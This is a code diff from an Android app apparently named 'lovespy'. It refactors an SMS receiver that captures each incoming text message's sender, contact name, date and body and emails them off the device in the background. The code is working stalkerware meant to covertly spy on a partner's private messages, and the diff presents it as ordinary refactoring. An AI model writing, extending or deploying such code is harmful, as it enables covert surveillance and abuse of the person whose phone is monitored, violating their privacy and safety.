@@ -10,27 +10,25 @@ import android.telephony.SmsMessage;
 import com.example.lovespy.app.email.EmailHelper;
 
 public class SmsReceivedListener extends BroadcastReceiver {
-
-    private Context mContext;
     private Bundle mBundle;
 
     @Override
-    public void onReceive(Context context, Intent intent) {
-        mContext = context;
+    public void onReceive(final Context context, Intent intent) {
         if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
             mBundle = intent.getExtras();
             new AsyncTask<String,Void,Void>() {
                 @Override
                 protected Void doInBackground(String... params) {
+                    EmailHelper emailHelper = new EmailHelper(context);
                     String letter = params[0];
-                    EmailHelper.trySending(letter, mContext);
+                    emailHelper.trySending(letter);
                     return null;
                 }
-            }.execute(getSmsDetails());
+            }.execute(getSmsDetails(context));
         }
     }
 
-    private String getSmsDetails(){
+    private String getSmsDetails(Context context){
         String message = "";
         SmsMessage[] msgs;
         String address, body;
@@ -39,23 +37,24 @@ public class SmsReceivedListener extends BroadcastReceiver {
             try {
                 Object[] pdus = (Object[]) mBundle.get("pdus");
                 msgs = new SmsMessage[pdus.length];
+                SmsHelper smsHelper = new SmsHelper(context);
                 for (int i = 0; i < msgs.length; i++) {
                     msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                     address = msgs[i].getOriginatingAddress();
                     body = msgs[i].getMessageBody();
                     time = msgs[i].getTimestampMillis();
                     if (i == 0) {
-                        message += "Date: "+SmsHelper.convertDate(time)+"\n";
-                        message += "Type: "+SmsHelper.INBOX+"\n";
+                        message += "Date: "+smsHelper.convertDate(time)+"\n";
+                        message += "Type: "+smsHelper.INBOX+"\n";
                         message += "Number: "+address+"\n";
-                        message += "Name: "+SmsHelper.getContactName(address, mContext)+"\n";
+                        message += "Name: "+smsHelper.getContactName(address)+"\n";
                         if (msgs.length == 1) {
-                            message += "Body: "+SmsHelper.removeNewLine(body)+"\n";
+                            message += "Body: "+smsHelper.removeNewLine(body)+"\n";
                         } else {
-                            message += "Body: "+SmsHelper.removeNewLine(body)+" ";
+                            message += "Body: "+smsHelper.removeNewLine(body)+" ";
                         }
                     } else {
-                        message += SmsHelper.removeNewLine(body)+" ";
+                        message += smsHelper.removeNewLine(body)+" ";
                     }
                 }
                 if (msgs.length == 1) {
